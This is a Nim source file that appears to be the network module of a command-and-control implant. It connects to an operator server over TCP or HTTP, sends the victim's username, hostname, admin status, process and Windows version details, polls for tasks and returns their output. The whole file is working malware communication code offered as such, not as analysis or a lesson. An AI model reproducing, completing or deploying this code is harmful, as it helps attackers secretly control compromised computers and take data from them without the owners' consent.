import std/[base64, json], tlv

when defined(tcp):
  import std/[net, os]
elif defined(http):
  import std/httpclient

import types

proc connectToC2*(app: App) =
  when defined(http) or defined(tcp):
    let b = initBuilder()
    b.addInt32(-1)
    b.addString("connect")
    b.addString("")
    b.addString("")
    let j = b.encodeString()

  when defined(http):
    try:
      let token = app.httpClient.getContent(app.httpRoot & "/r")
      app.token = token
      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=j)
    except OSError: discard
  elif defined(tcp):
    try:
      app.socket = newSocket()
      app.socket.connect(app.ip, Port(app.port))
      app.socket.send(j & "\r\n")
    except OSError:
      sleep(app.autoConnectTime)

proc sendData(app: App, data: string) =
  when defined(tcp):
    try: app.socket.send(data & "\r\n")
    except: app.connectToC2()
  elif defined(http):
    try:
      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=data)
      when defined(debug):
        echo "sending " & data
    except OSError:
      return

type 
  TaskOutput* = ref object
    task*: string
    taskId*: int
    error*: string
    data*: string

proc sendOutput*(app: App, taskOutput: TaskOutput) =
  let b = initBuilder()
  b.addInt32(cast[int32](taskOutput.taskId))
  b.addString(taskOutput.task)
  b.addString(taskOutput.error)
  b.addString(taskOutput.data)
  app.sendData(b.encodeString())

proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
              windowsVersionInfo: tuple[majorVersion: int, minorVersion: int, buildNumber: int],
              pid: int, pname: string) =
  let taskOutput = TaskOutput(
    task: "identify",
    taskId: taskId,
    error: "",
    data: ""
  )

  let b = initBuilder()

  b.addString(username)
  b.addString(hostname)
  b.addBool(isAdmin)
  b.addString(osType)
  b.addInt32(cast[int32](pid))
  b.addString(pname)
  b.addInt32(cast[int32](windowsVersionInfo.majorVersion))
  b.addInt32(cast[int32](windowsVersionInfo.minorVersion))
  b.addInt32(cast[int32](windowsVersionInfo.buildNumber))
  
  taskOutput.data = b.encodeString()
  app.sendOutput(taskOutput)

proc unknownTask*(app: App, taskId: int, taskName: string) =
  let b = initBuilder()
  b.addInt32(cast[int32](taskId))
  b.addString(taskName)
  b.addString("unknown task")
  b.addString("")
  let j = b.encodeString()
  app.sendData($j)

proc newTaskOutput*(taskId: int): TaskOutput =
  TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: ""
  )

proc fetchTasks*(app: App): JsonNode =
  when defined(tcp):
    try: app.socket.send("tasksplz\r\n")
    except: 
      app.connectToC2()
      return %*[]
    let line = app.socket.recvLine()
    if line.len == 0:
      app.socket.close()
    let decoded = decode(line)
    result = parseJson(decoded)
  
  elif defined(http):
    echo "checking tasks boi"
    var httpResponse: string
    try:
      # fetch the tasks using our token
      httpResponse = app.httpClient.getContent(app.httpRoot & "/t?id=" & app.token)
    except OSError:
      # server is down, rebuild the http client
      # because otherwise the old connection
      # would be used (known bug)
      app.httpClient = newHttpClient()
      return %*[]
    except HttpRequestError:
      # server is back up, but our token is invalid
      # so we should refresh it
      app.connectToC2()
      return %*[]
    result = parseJson(decode(httpResponse))
